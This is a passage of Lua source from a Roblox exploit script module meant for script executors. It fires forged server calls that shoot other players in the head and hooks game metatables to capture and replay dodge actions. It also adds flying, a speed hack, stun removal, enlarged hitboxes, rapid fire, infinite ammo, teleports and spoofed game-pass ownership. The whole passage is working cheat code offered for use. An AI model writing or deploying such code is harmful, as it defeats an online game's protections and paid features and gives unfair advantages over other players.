            ClientRayPosition = Vector3.new(-220.17489624023438, 183.2957763671875, 301.07257080078125),
            bulletCF = CFrame.new(-220.5039825439453, 185.22506713867188, 302.133544921875, 0.9551116228103638, 0.2567310333251953, -0.14782091975212097, 7.450581485102248e-9, 0.4989798665046692, 0.8666135668754578, 0.2962462604045868, -0.8277127146720886, 0.4765814542770386),
            HitTargets = {
                [targetPlayerName] = "Head"
            },
            bulletSizeC = Vector3.new(0.009999999776482582, 0.009999999776482582, 4.452499866485596),
            NoMuzzleFX = false,
            FirePosition = Vector3.new(-72.88850402832031, -679.4803466796875, -173.31005859375)
        }
    }
    
    pcall(function()
        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FiredGunClient"):FireServer(unpack(args))
    end)
    
    return true
end

MainModule.TrackPlayerEffects = function(player)
    if MainModule.EffectShooter.TrackedPlayers[player] then
        return
    end
    
    local connections = {}
    
    local characterAdded = player.CharacterAdded:Connect(function(character)
        task.wait(0.5)
    end)
    table.insert(connections, characterAdded)
    
    if player.Character then
        local descendantAdded = player.Character.DescendantAdded:Connect(function(descendant)
        end)
        table.insert(connections, descendantAdded)
    end
    
    MainModule.EffectShooter.TrackedPlayers[player] = connections
end

MainModule.ToggleEffectShooter = function(enabled)
    MainModule.EffectShooter.Enabled = enabled
    
    if MainModule.EffectShooter.Connection then
        MainModule.EffectShooter.Connection:Disconnect()
        MainModule.EffectShooter.Connection = nil
    end
    
    if enabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                MainModule.TrackPlayerEffects(player)
            end
        end
        
        local playerAdded = Players.PlayerAdded:Connect(function(player)
            if player ~= LocalPlayer then
                MainModule.TrackPlayerEffects(player)
            end
        end)
        
        MainModule.EffectShooter.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.EffectShooter.Enabled then return end
            
            local currentTime = tick()
            if currentTime - MainModule.EffectShooter.LastShootTime < MainModule.EffectShooter.ShootCooldown then return end
            
            local gun = MainModule.GetLocalGun()
            if not gun then return end
            
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and MainModule.HasTargetEffect(player) then
                    MainModule.ShootAtPlayer(player.Name)
                    task.wait(0.03)
                end
            end
            
            MainModule.EffectShooter.LastShootTime = tick()
        end)
    else
        for player, connections in pairs(MainModule.EffectShooter.TrackedPlayers) do
            for _, conn in pairs(connections) do
                conn:Disconnect()
            end
        end
        MainModule.EffectShooter.TrackedPlayers = {}
        MainModule.EffectShooter.LastShootTime = 0
    end
    PlayToggleSound()
end

MainModule.IsMobile = function()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

MainModule.IsGameActive = function(gameName)
    local values = Workspace:FindFirstChild("Values")
    if not values then return false end
    local currentGame = values:FindFirstChild("CurrentGame")
    return currentGame and currentGame.Value == gameName
end

MainModule.DisableToggle = function(toggleName)
    if ToggleRefs[toggleName] and ToggleRefs[toggleName].SetValue then
        pcall(function() ToggleRefs[toggleName]:SetValue(false) end)
    end
end

MainModule.CanEnableToggle = function(gameName, toggleName, toggleRef)
    if not MainModule.IsGameActive(gameName) then
        MainModule.Notify(toggleName, "Wait for " .. gameName .. "!", 0.9)
        PlayErrorSound()
        if toggleRef and toggleRef.SetValue then
            pcall(function() toggleRef:SetValue(false) end)
        end
        return false
    end
    
    if not MainModule.IsFeatureSupported(toggleName) then
        MainModule.Notify(toggleName, "Not supported in your executor", 0.9)
        PlayErrorSound()
        if toggleRef and toggleRef.SetValue then
            pcall(function() toggleRef:SetValue(false) end)
        end
        return false
    end
    
    return true
end

MainModule.SafeTeleport = function(pos)
    local c = MainModule.GetCharacter()
    if c then
        local rp = MainModule.GetRootPart(c)
        if rp then rp.CFrame = CFrame.new(pos); return true end
    end
    return false
end

MainModule.IsHider = function(p)
    return p and p:GetAttribute("IsHider") == true
end

MainModule.IsSeeker = function(p)
    return p and p:GetAttribute("IsHunter") == true
end

MainModule.FaceTargetModule = {
    Enabled = false,
    Connection = nil
}

MainModule.ToggleFaceTarget = function(enabled)
    if type(enabled) ~= "boolean" then
        enabled = not MainModule.FaceTargetModule.Enabled
    end

    if MainModule.FaceTargetModule.Connection then
        MainModule.FaceTargetModule.Connection:Disconnect()
        MainModule.FaceTargetModule.Connection = nil
    end
    
    MainModule.FaceTargetModule.Enabled = enabled
    
    if enabled then
        MainModule.FaceTargetModule.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.FaceTargetModule.Enabled then return end
            
            local character = LocalPlayer.Character
            if not character then return end
            local root = character:FindFirstChild("HumanoidRootPart")
            if not root then return end
            
            local closestPlayer = nil
            local shortestDistance = math.huge
            local myPos = root.Position
            
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        local dist = (targetRoot.Position - myPos).Magnitude
                        if dist < shortestDistance then
                            shortestDistance = dist
                            closestPlayer = player
                        end
                    end
                end
            end
            
            if closestPlayer and closestPlayer.Character then
                local targetRoot = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    local lookAt = CFrame.lookAt(root.Position, targetRoot.Position)
                    root.CFrame = CFrame.new(root.Position) * (lookAt - lookAt.Position)
                end
            end
        end)
    else
    end
    PlayToggleSound()
end

MainModule.AutoDodge = {
    Enabled = false,
    AnimationIds = {
        "rbxassetid://88451099342711",
        "rbxassetid://79649041083405",
        "rbxassetid://73242877658272",
        "rbxassetid://114928327045353",
        "rbxassetid://135690448001690",
        "rbxassetid://103355259844069",
        "rbxassetid://125906547773381",
        "rbxassetid://121147456137931",
        "rbxassetid://96924216250322",
        "rbxassetid://116839849594540",
        "rbxassetid://104041807075625",
        "rbxassetid://83057176809194",
        "rbxassetid://103318207627541",
        "rbxassetid://121473077508383",
        "rbxassetid://94215646393565",
        "rbxassetid://81533666958052",
        "rbxassetid://116839849594540"
    },
    Connections = {},
    LastDodgeTime = 0,
    DodgeCooldown = 0.9,
    Range = 3.8,
    RangeSquared = 3.8 * 3.8,
    AnimationIdsSet = {},
    ActiveAnimations = {},
    LastAnimationStartTime = {},
    CapturedCall = nil,
    LastCapturedCallTime = 0,
    OriginalFireServer = nil,
    Remote = nil,
    HeartbeatConnection = nil,
    DodgeAttempts = {}
}

for _, id in ipairs(MainModule.AutoDodge.AnimationIds) do
    MainModule.AutoDodge.AnimationIdsSet[id] = true
end

MainModule.getLocalPlayer = function()
    local success, player = pcall(function()
        return game:GetService("Players").LocalPlayer
    end)
    if success and player then
        return player
    end
    return nil
end

MainModule.setupRemoteHook = function()
    local canHook = pcall(function()
        return getrawmetatable and hookfunction and setreadonly
    end)
    
    local rs = game:GetService("ReplicatedStorage")
    local remote = nil
    
    if rs:FindFirstChild("Remotes") and rs.Remotes:FindFirstChild("UsedTool") then
        remote = rs.Remotes.UsedTool
    elseif rs:FindFirstChild("Events") and rs.Events:FindFirstChild("UsedTool") then
        remote = rs.Events.UsedTool
    else
        for _, folder in pairs(rs:GetChildren()) do
            if folder:FindFirstChild("UsedTool") then
                remote = folder.UsedTool
                break
            end
        end
    end
    
    if not remote then return false end
    
    MainModule.AutoDodge.Remote = remote
    
    local function findDodgeInArgs(...)
        local args = {...}
        
        local function searchInTable(tbl)
            for k, v in pairs(tbl) do
                if typeof(v) == "Instance" and v:IsA("Tool") and v.Name == "DODGE!" then
                    return true
                elseif typeof(v) == "table" then
                    if searchInTable(v) then
                        return true
                    end
                end
            end
            return false
        end
        
        for _, arg in ipairs(args) do
            if typeof(arg) == "Instance" and arg:IsA("Tool") and arg.Name == "DODGE!" then
                return true
            elseif typeof(arg) == "table" then
                if searchInTable(arg) then
                    return true
                end
            end
        end
        return false
    end
    
    MainModule.AutoDodge.OriginalFireServer = remote.FireServer
    
    if not canHook then
        if getnamecallmethod then
            local mt = getrawmetatable(remote)
            if mt then
                local oldNamecall = mt.__namecall
                mt.__namecall = function(self, ...)
                    local method = getnamecallmethod()
                    if method == "FireServer" then
                        local args = {...}
                        for _, arg in ipairs(args) do
                            if typeof(arg) == "Instance" and arg:IsA("Tool") and arg.Name == "DODGE!" then
                                MainModule.AutoDodge.CapturedCall = {
                                    args = args,
                                    timestamp = tick(),
                                    tool = nil
                                }
                                MainModule.AutoDodge.LastCapturedCallTime = tick()
                                break
                            end
                        end
                    end
                    return oldNamecall and oldNamecall(self, ...) or MainModule.AutoDodge.OriginalFireServer(self, ...)
                end
            end
        end
        return true
    end
    
    local hookSuccess, hookError = pcall(function()
        if remote.ClassName == "RemoteEvent" then
            local mt = getrawmetatable(game)
            if mt then
                local oldIndex = mt.__index
                
                local success, err = pcall(function()
                    setreadonly(mt, false)
                end)
                
                if success then
                    mt.__index = function(self, key)
                        if self == remote and key == "FireServer" then
                            return function(self, ...)
                                local hasDodge = findDodgeInArgs(...)
                                local result = MainModule.AutoDodge.OriginalFireServer(self, ...)
                                
                                if hasDodge then
                                    local copiedArgs = {...}
                                    MainModule.AutoDodge.CapturedCall = {
                                        args = copiedArgs,
                                        timestamp = tick(),
                                        tool = nil
                                    }
                                    MainModule.AutoDodge.LastCapturedCallTime = tick()
                                end
                                
                                return result
                            end
                        end
                        return oldIndex(self, key)
                    end
                    
                    setreadonly(mt, true)
                end
            end
        else
            hookfunction(remote.FireServer, function(self, ...)
                local hasDodge = findDodgeInArgs(...)
                local result = MainModule.AutoDodge.OriginalFireServer(self, ...)
                
                if hasDodge then
                    local copiedArgs = {...}
                    MainModule.AutoDodge.CapturedCall = {
                        args = copiedArgs,
                        timestamp = tick(),
                        tool = nil
                    }
                    MainModule.AutoDodge.LastCapturedCallTime = tick()
                end
                
                return result
            end)
        end
    end)
    
    return true
end

MainModule.executeDodge = function()
    if not MainModule.AutoDodge.Enabled then return false end
    
    local currentTime = tick()
    if currentTime - MainModule.AutoDodge.LastDodgeTime < MainModule.AutoDodge.DodgeCooldown then return false end
    if not MainModule.AutoDodge.CapturedCall then return false end
    
    local player = MainModule.getLocalPlayer()
    if not player then return false end
    
    local dodgeTool
    local character = player.Character
    if character then
        dodgeTool = character:FindFirstChild("DODGE!")
        if not dodgeTool and player.Backpack then
            dodgeTool = player.Backpack:FindFirstChild("DODGE!")
        end
    end
    
    if not dodgeTool then return false end
    
    local modifiedArgs = {}
    for i, arg in ipairs(MainModule.AutoDodge.CapturedCall.args) do
        if typeof(arg) == "Instance" and arg:IsA("Tool") and arg.Name == "DODGE!" then
            modifiedArgs[i] = dodgeTool
        else
            modifiedArgs[i] = arg
        end
    end
    
    MainModule.AutoDodge.LastDodgeTime = currentTime
    
    local success = pcall(function()
        MainModule.AutoDodge.Remote:FireServer(unpack(modifiedArgs))
    end)
    
    if not success then
        pcall(function()
            MainModule.AutoDodge.Remote:FireServer(dodgeTool)
        end)
        return false
    end
    
    return true
end

MainModule.isLookingAtPlayer = function(targetPlayer, localPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    if not localPlayer or not localPlayer.Character then return false end
    
    local targetHead = targetPlayer.Character:FindFirstChild("Head")
    local localRoot = localPlayer.Character:FindFirstChild("HumanoidRootPart")
    
    if not (targetHead and localRoot) then return false end
    
    local directionToLocal = (localRoot.Position - targetHead.Position).Unit
    local lookVector = targetHead.CFrame.LookVector
    local dotProduct = directionToLocal:Dot(lookVector)
    
    return dotProduct > 0.1
end

MainModule.setupHeartbeatProcessing = function()
    local function instantHeartbeatCheck()
        if not MainModule.AutoDodge.Enabled then return end
        
        local LocalPlayer = MainModule.getLocalPlayer()
        if not LocalPlayer or not LocalPlayer.Character then return end
        
        local currentTime = tick()
        if currentTime - MainModule.AutoDodge.LastDodgeTime < MainModule.AutoDodge.DodgeCooldown then return end
        
        local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not localRoot then return end
        
        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            if player == LocalPlayer then continue end
            if not player.Character then continue end
            
            local character = player.Character
            local targetRoot = character:FindFirstChild("HumanoidRootPart")
            if not targetRoot then continue end
            
            local distanceVector = targetRoot.Position - localRoot.Position
            local distanceSquared = distanceVector.Magnitude
            
            if distanceSquared > MainModule.AutoDodge.RangeSquared then
                MainModule.AutoDodge.ActiveAnimations[player.Name] = nil
                continue
            end
            
            if not MainModule.isLookingAtPlayer(player, LocalPlayer) then continue end
            
            local humanoid = character:FindFirstChild("Humanoid")
            if not humanoid then continue end
            
            local playingTracks = humanoid:GetPlayingAnimationTracks()
            
            for _, track in pairs(playingTracks) do
                if track and track.Animation and track.IsPlaying then
                    local animId = track.Animation.AnimationId
                    
                    if MainModule.AutoDodge.AnimationIdsSet[animId] then
                        if not MainModule.AutoDodge.ActiveAnimations[player.Name] then
                            MainModule.AutoDodge.ActiveAnimations[player.Name] = {}
                        end
                        
                        local animationKey = animId
                        
                        if not MainModule.AutoDodge.ActiveAnimations[player.Name][animationKey] then
                            MainModule.AutoDodge.ActiveAnimations[player.Name][animationKey] = true
                            
                            if MainModule.executeDodge() then
                                if track.Stopped then
                                    track.Stopped:Once(function()
                                        if MainModule.AutoDodge.ActiveAnimations[player.Name] then
                                            MainModule.AutoDodge.ActiveAnimations[player.Name][animationKey] = nil
                                        end
                                    end)
                                else
                                    task.delay(2, function()
                                        if MainModule.AutoDodge.ActiveAnimations[player.Name] then
                                            MainModule.AutoDodge.ActiveAnimations[player.Name][animationKey] = nil
                                        end
                                    end)
                                end
                                return
                            else
                                MainModule.AutoDodge.ActiveAnimations[player.Name][animationKey] = nil
                            end
                        end
                    end
                end
            end
        end
    end
    
    MainModule.AutoDodge.HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(instantHeartbeatCheck)
    table.insert(MainModule.AutoDodge.Connections, MainModule.AutoDodge.HeartbeatConnection)
end

MainModule.setupPlayerCleanupTracking = function()
    local Players = game:GetService("Players")
    
    local function setupCharacter(player, character)
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Died:Once(function()
                MainModule.AutoDodge.ActiveAnimations[player.Name] = nil
                MainModule.AutoDodge.LastAnimationStartTime[player.Name] = nil
            end)
        end
    end
    
    local function onPlayerAdded(player)
        local LocalPlayer = MainModule.getLocalPlayer()
        if player == LocalPlayer then return end
        
        if player.Character then
            setupCharacter(player, player.Character)
        end
        
        local charConn = player.CharacterAdded:Connect(function(character)
            setupCharacter(player, character)
        end)
        
        table.insert(MainModule.AutoDodge.Connections, charConn)
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        onPlayerAdded(player)
    end
    
    local playerAddedConn = Players.PlayerAdded:Connect(onPlayerAdded)
    table.insert(MainModule.AutoDodge.Connections, playerAddedConn)
end

MainModule.setupLeaveCleanup = function()
    local Players = game:GetService("Players")
    local LocalPlayer = MainModule.getLocalPlayer()
    
    if LocalPlayer then
        local playerRemovingConn = Players.PlayerRemoving:Connect(function(player)
            if player == LocalPlayer then
                MainModule.ToggleAutoDodge(false)
            else
                MainModule.AutoDodge.ActiveAnimations[player.Name] = nil
                MainModule.AutoDodge.LastAnimationStartTime[player.Name] = nil
            end
        end)
        table.insert(MainModule.AutoDodge.Connections, playerRemovingConn)
    end
end

MainModule.ToggleAutoDodge = function(enabled)
    local toggleRef = ToggleRefs.AutoDodge
    
    if enabled then
        if not MainModule.CanEnableToggle("HideAndSeek", "Auto Dodge", toggleRef) then
            return false
        end
    end
    
    for _, conn in pairs(MainModule.AutoDodge.Connections) do
        if conn then pcall(function() conn:Disconnect() end) end
    end
    
    MainModule.AutoDodge.Enabled = false
    MainModule.AutoDodge.Connections = {}
    MainModule.AutoDodge.ActiveAnimations = {}
    MainModule.AutoDodge.LastAnimationStartTime = {}
    MainModule.AutoDodge.LastDodgeTime = 0
    MainModule.AutoDodge.HeartbeatConnection = nil
    
    if enabled then
        MainModule.AutoDodge.Enabled = true
        
        if not MainModule.AutoDodge.Remote then
            MainModule.setupRemoteHook()
        end
        
        MainModule.setupPlayerCleanupTracking()
        MainModule.setupHeartbeatProcessing()
        MainModule.setupLeaveCleanup()
    else
    end
    PlayToggleSound()
    return true
end

pcall(MainModule.setupRemoteHook)


MainModule.Fly = {Enabled = false, Speed = 100, Connection = nil, BodyVelocity = nil}

MainModule.ToggleFly = function(enabled, silent)
    if enabled then
        if MainModule.Fly.Enabled then return end
        MainModule.Fly.Enabled = true
        local c = MainModule.GetCharacter()
        if not c then return end
        local h = MainModule.GetHumanoid(c)
        local rp = MainModule.GetRootPart(c)
        if not (h and rp) then return end
        
        h.UseJumpPower = false
        h.AutoRotate = false
        h.PlatformStand = true
        
        if MainModule.Fly.BodyVelocity then MainModule.Fly.BodyVelocity:Destroy() end
        local bv = Instance.new("BodyVelocity")
        bv.Name = "FlyBodyVelocity"
        bv.MaxForce = Vector3.new(40000, 40000, 40000)
        bv.Parent = rp
        MainModule.Fly.BodyVelocity = bv
        
        MainModule.Fly.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.Fly.Enabled or not c or not c.Parent then 
                MainModule.ToggleFly(false, true)
                return 
            end
            rp = MainModule.GetRootPart(c)
            h = MainModule.GetHumanoid(c)
            if not rp or not bv or not h then 
                MainModule.ToggleFly(false, true)
                return 
            end
            
            local cam = workspace.CurrentCamera
            if not cam then return end
            
            local camCF = cam.CFrame
            local forward = camCF.LookVector
            local right = camCF.RightVector
            local up = camCF.UpVector
            
            local keyPressed = false
            local moveDirection = Vector3.new(0,0,0)
            
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDirection = moveDirection + forward; keyPressed = true end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDirection = moveDirection - forward; keyPressed = true end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDirection = moveDirection - right; keyPressed = true end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDirection = moveDirection + right; keyPressed = true end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDirection = moveDirection + up; keyPressed = true end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then moveDirection = moveDirection - up; keyPressed = true end
            
            if not keyPressed then
                local joyDir = h.MoveDirection
                if joyDir.Magnitude > 0.1 then
                    moveDirection = (forward * joyDir.Z) + (right * joyDir.X) + (up * joyDir.Y)
                    keyPressed = true
                end
            end
            
            if keyPressed and moveDirection.Magnitude > 0 then
                bv.Velocity = moveDirection.Unit * MainModule.Fly.Speed
            else
                bv.Velocity = Vector3.new(0,0,0)
            end
        end)
        if not silent then end
    else
        if not MainModule.Fly.Enabled then return end
        MainModule.Fly.Enabled = false
        if MainModule.Fly.Connection then MainModule.Fly.Connection:Disconnect(); MainModule.Fly.Connection = nil end
        if MainModule.Fly.BodyVelocity then MainModule.Fly.BodyVelocity:Destroy(); MainModule.Fly.BodyVelocity = nil end
        local c = MainModule.GetCharacter()
        if c then
            local rp = MainModule.GetRootPart(c)
            if rp then rp.AssemblyLinearVelocity = Vector3.new(0,0,0) end
            local h = MainModule.GetHumanoid(c)
            if h then
                h.UseJumpPower = true
                h.AutoRotate = true
                h.PlatformStand = false
            end
        end
        if not silent then end
    end
    if not silent then PlayToggleSound() end
end

MainModule.SetFlySpeed = function(speed)
    MainModule.Fly.Speed = speed
end

MainModule.harmfulEffectsList = {"RagdollStun","Stun","Stunned","StunEffect","StunHit","Knockback","Knockdown","Knockout","Dazed","Paralyzed","Freeze","Frozen","Sleep","Slow","Slowed","Root","Rooted", "Crawling", "Crawled"}
MainModule.RemoveStunEnabled = false

MainModule.ToggleRemoveStun = function(enabled)
    MainModule.RemoveStunEnabled = enabled
    if enabled then
        local function remove()
            local c = MainModule.GetCharacter()
            if not c then return end
            for _, e in ipairs(MainModule.harmfulEffectsList) do
                local eff = c:FindFirstChild(e)
                if eff then pcall(function() eff:Destroy() end) end
            end
            local h = MainModule.GetHumanoid(c)
            if h and h:GetAttribute("Stunned") then h:SetAttribute("Stunned", false) end
        end
        remove()
        RunService.Heartbeat:Connect(function() if MainModule.RemoveStunEnabled then remove() end end)
    else
    end
    PlayToggleSound()
end

MainModule.SpeedHackEnabled = false
MainModule.SpeedValue = 39
MainModule.SpeedHackLoop = nil

MainModule.ToggleSpeedHack = function(enabled)
    MainModule.SpeedHackEnabled = enabled
    if enabled then
        if MainModule.SpeedHackLoop then task.cancel(MainModule.SpeedHackLoop) end
        MainModule.SpeedHackLoop = task.spawn(function()
            while MainModule.SpeedHackEnabled do
                local c = MainModule.GetCharacter()
                if c then
                    local h = MainModule.GetHumanoid(c)
                    if h and h.Health > 0 then
                        h.WalkSpeed = MainModule.SpeedValue
                    end
                end
                task.wait(0.1)
            end
        end)
    else
        if MainModule.SpeedHackLoop then task.cancel(MainModule.SpeedHackLoop); MainModule.SpeedHackLoop = nil end
        local c = MainModule.GetCharacter()
        if c then
            local h = MainModule.GetHumanoid(c)
            if h then
                h.WalkSpeed = 16
            end
        end
    end
    PlayToggleSound()
end

MainModule.SetSpeedValue = function(v)
    MainModule.SpeedValue = math.min(v, 50)
    if MainModule.SpeedHackEnabled then
        local c = MainModule.GetCharacter()
        if c then
            local h = MainModule.GetHumanoid(c)
            if h and h.Health > 0 then
                h.WalkSpeed = MainModule.SpeedValue
            end
        end
    end
end

MainModule.FOVEnabled = false
MainModule.FOVValue = 120
MainModule.FOVConnection = nil

MainModule.ToggleFOV = function(enabled)
    if type(enabled) ~= "boolean" then
        enabled = not MainModule.FOVEnabled
    end
    MainModule.FOVEnabled = enabled
    local cam = workspace.CurrentCamera
    if enabled then
        cam.FieldOfView = MainModule.FOVValue
        if MainModule.FOVConnection then
            MainModule.FOVConnection:Disconnect()
        end
        MainModule.FOVConnection = cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            if MainModule.FOVEnabled and cam.FieldOfView ~= MainModule.FOVValue then
                cam.FieldOfView = MainModule.FOVValue
            end
        end)
    else
        if MainModule.FOVConnection then
            MainModule.FOVConnection:Disconnect()
            MainModule.FOVConnection = nil
        end
        cam.FieldOfView = 70
    end
    PlayToggleSound()
end

MainModule.SetFOV = function(v)
    MainModule.FOVValue = math.min(v, 120)
    if MainModule.FOVEnabled then
        workspace.CurrentCamera.FieldOfView = MainModule.FOVValue
    end
end

MainModule.AutoQTEMode = "Legit"
MainModule.AutoQTEEnabled = false

MainModule.ToggleAutoQTE = function(enabled)
    local toggleRef = ToggleRefs.AutoQTE
    
    if enabled then
        if MainModule.IsXenoExecutor() then
            MainModule.Notify("Auto QTE", "Not supported in your executor", 0.9)
            PlayErrorSound()
            if toggleRef and toggleRef.SetValue then
                pcall(function() toggleRef:SetValue(false) end)
            end
            return false
        end
    end
    
    MainModule.AutoQTEEnabled = enabled
    if enabled then
        local ImpactFrames = LocalPlayer.PlayerGui:FindFirstChild("ImpactFrames")
        if ImpactFrames then
            local processed = {}
            ImpactFrames.ChildAdded:Connect(function(outer)
                if outer.Name ~= "OuterRingTemplate" or processed[outer] then return end
                processed[outer] = true
                task.defer(function()
                    local inner = nil
                    for _, g in pairs(ImpactFrames:GetChildren()) do
                        if g.Name == "InnerTemplate" and g.Position == outer.Position and not g:GetAttribute("Failed") then
                            inner = g; break
                        end
                    end
                    if not inner or inner:GetAttribute("Tweening") or inner:GetAttribute("Failed") then return end
                    local HBGQTE = require(ReplicatedStorage.Modules.HBGQTE)
                    if MainModule.AutoQTEMode == "Legit" then
                        pcall(function() HBGQTE.Pressed(false, {Inner=inner, Outer=outer, Duration=2, StartedAt=tick(), Data={}}) end)
                    else
                        pcall(function() 
                            HBGQTE.Pressed(true, {Inner=inner, Outer=outer, Duration=0.1, StartedAt=tick(), Data={}})
                        end)
                    end
                end)
            end)
        end
    else
    end
    PlayToggleSound()
    return true
end

MainModule.SetAutoQTEMode = function(mode)
    MainModule.AutoQTEMode = mode
end

MainModule.TeleportUp = function()
    local c = MainModule.GetCharacter()
    if c then
        local rp = MainModule.GetRootPart(c)
        if rp then rp.CFrame = rp.CFrame + Vector3.new(0,100,0); MainModule.Notify("Teleport","Up 100",0.9) end
    end
    PlayBell()
end

MainModule.TeleportDown = function()
    local c = MainModule.GetCharacter()
    if c then
        local rp = MainModule.GetRootPart(c)
        if rp then rp.CFrame = rp.CFrame + Vector3.new(0,-40,0); MainModule.Notify("Teleport","Down 40",0.9) end
    end
    PlayBell()
end

MainModule.GamePassStates = {
    PermanentGuard = false,
    GlassVision = false,
    EmotePages = false,
    CustomPlayerTag = false,
    PrivateServerPlus = false,
    FreeVIP = false,
    Lighter = false
}

MainModule.TogglePermanentGuard = function(enabled)
    MainModule.GamePassStates.PermanentGuard = enabled
    LocalPlayer:SetAttribute("__OwnsPermGuard", enabled)
    PlayToggleSound()
end

MainModule.ToggleGlassVision = function(enabled)
    MainModule.GamePassStates.GlassVision = enabled
    LocalPlayer:SetAttribute("__OwnsGlassManufacturerVision", enabled)
    PlayToggleSound()
end

MainModule.ToggleEmotePages = function(enabled)
    MainModule.GamePassStates.EmotePages = enabled
    LocalPlayer:SetAttribute("__OwnsEmotePages", enabled)
    PlayToggleSound()
end

MainModule.ToggleCustomPlayerTag = function(enabled)
    MainModule.GamePassStates.CustomPlayerTag = enabled
    LocalPlayer:SetAttribute("__OwnsCustomPlayerTag", enabled)
    PlayToggleSound()
end

MainModule.TogglePrivateServerPlus = function(enabled)
    MainModule.GamePassStates.PrivateServerPlus = enabled
    LocalPlayer:SetAttribute("__OwnsPSPlus", enabled)
    PlayToggleSound()
end


MainModule.ToggleLighter = function(enabled)
    MainModule.GamePassStates.Lighter = enabled
    LocalPlayer:SetAttribute("HasLighter", enabled)
    PlayToggleSound()
end

MainModule.HitboxEnabled = false
MainModule.HitboxSize = 1
MainModule.HitboxTransparency = 1
MainModule.ModifiedParts = {}
MainModule.HitboxConnection = nil

MainModule.ToggleHitboxExpander = function(enabled)
    MainModule.HitboxEnabled = enabled
    
    if MainModule.HitboxConnection then
        MainModule.HitboxConnection:Disconnect()
        MainModule.HitboxConnection = nil
    end
    
    if enabled then
        MainModule.HitboxConnection = RunService.Heartbeat:Connect(function()
            if not MainModule.HitboxEnabled then return end
            
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and p.Character then
                    local r = p.Character:FindFirstChild("HumanoidRootPart")
                    if r and not MainModule.ModifiedParts[r] then
                        MainModule.ModifiedParts[r] = {
                            Size = r.Size,
                            CanCollide = r.CanCollide,
                            Transparency = r.Transparency
                        }
                        r.Size = Vector3.new(MainModule.HitboxSize, MainModule.HitboxSize, MainModule.HitboxSize)
                        r.CanCollide = false
                        r.Transparency = MainModule.HitboxTransparency
                    end
                end
            end
        end)
        MainModule.Notify("Hitbox", "Enabled", 0.9)
    else
        for part, props in pairs(MainModule.ModifiedParts) do
            if part and part.Parent then
                part.Size = props.Size
                part.CanCollide = props.CanCollide
                part.Transparency = props.Transparency
            end
        end
        MainModule.ModifiedParts = {}
        MainModule.Notify("Hitbox", "Disabled", 0.9)
    end
    PlayToggleSound()
end

function MainModule.SetHitboxTransparency(value)
    MainModule.HitboxTransparency = value / 100
    if MainModule.HitboxEnabled then
        for part, _ in pairs(MainModule.ModifiedParts) do
            if part and part.Parent then
                part.Transparency = MainModule.HitboxTransparency
            end
        end
    end
end

function MainModule.SetHitboxSize(value)
    MainModule.HitboxSize = value
    if MainModule.HitboxEnabled then
        for part, _ in pairs(MainModule.ModifiedParts) do
            if part and part.Parent then
                part.Size = Vector3.new(value, value, value)
            end
        end
    end
end

MainModule.RapidFireEnabled = false
MainModule.OriginalFireRates = {}

MainModule.ToggleRapidFire = function(enabled)
    MainModule.RapidFireEnabled = enabled
    if enabled then
        RunService.Heartbeat:Connect(function()
            if not MainModule.RapidFireEnabled then return end
            pcall(function()
                local w = ReplicatedStorage:FindFirstChild("Weapons")
                if w and w:FindFirstChild("Guns") then
                    for _, o in pairs(w.Guns:GetDescendants()) do
                        if o.Name == "FireRateCD" and (o:IsA("NumberValue") or o:IsA("IntValue")) then
                            if not MainModule.OriginalFireRates[o] then MainModule.OriginalFireRates[o] = o.Value end
                            o.Value = 0
                        end
                    end
                end
                local c = MainModule.GetCharacter()
                if c then for _, t in pairs(c:GetChildren()) do if t:IsA("Tool") then for _, o in pairs(t:GetDescendants()) do if o.Name == "FireRateCD" and (o:IsA("NumberValue") or o:IsA("IntValue")) then if not MainModule.OriginalFireRates[o] then MainModule.OriginalFireRates[o] = o.Value end; o.Value = 0 end end end end end
            end)
        end)
    else
        for o,v in pairs(MainModule.OriginalFireRates) do if o and o.Parent then o.Value = v end end
        MainModule.OriginalFireRates = {}
    end
    PlayToggleSound()
end

MainModule.InfiniteAmmoEnabled = false
MainModule.OriginalAmmo = {}

MainModule.ToggleInfiniteAmmo = function(enabled)
    MainModule.InfiniteAmmoEnabled = enabled
    if enabled then
        RunService.Heartbeat:Connect(function()
            if not MainModule.InfiniteAmmoEnabled then return end
            pcall(function()
                local c = MainModule.GetCharacter()
                if c then for _, t in pairs(c:GetChildren()) do if t:IsA("Tool") then for _, o in pairs(t:GetDescendants()) do if (o:IsA("NumberValue") or o:IsA("IntValue")) and (o.Name:lower():find("ammo") or o.Name:lower():find("bullet")) then if not MainModule.OriginalAmmo[o] then MainModule.OriginalAmmo[o] = o.Value end; o.Value = math.huge end end end end end
                local bp = LocalPlayer:FindFirstChild("Backpack")
                if bp then for _, t in pairs(bp:GetChildren()) do if t:IsA("Tool") then for _, o in pairs(t:GetDescendants()) do if (o:IsA("NumberValue") or o:IsA("IntValue")) and (o.Name:lower():find("ammo") or o.Name:lower():find("bullet")) then if not MainModule.OriginalAmmo[o] then MainModule.OriginalAmmo[o] = o.Value end; o.Value = math.huge end end end end end
            end)
        end)
    else
        for o,v in pairs(MainModule.OriginalAmmo) do if o and o.Parent then o.Value = v end end
        MainModule.OriginalAmmo = {}
    end
    PlayToggleSound()
end

